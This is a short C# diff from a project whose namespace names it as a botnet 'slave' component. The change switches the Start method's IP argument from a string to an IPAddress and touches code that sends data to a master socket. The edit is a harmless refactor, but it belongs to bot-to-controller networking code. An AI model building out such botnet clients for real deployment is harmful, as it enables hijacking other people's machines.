@@ -71,10 +71,10 @@ namespace CozyThunder.Botnet.Slave
             master_.BeginSend(byteData, 0, byteData.Length, 0, new AsyncCallback(SendCallback), master_);
         }
 
-        public bool Start(string ip, int port, ISlavePeerListener listener)
+        public bool Start(IPAddress ip, int port, ISlavePeerListener listener)
         {
             listener_ = listener;
-            EndPoint = new IPEndPoint(IPAddress.Parse(ip), port);
+            EndPoint = new IPEndPoint(ip, port);
 
             try
             {
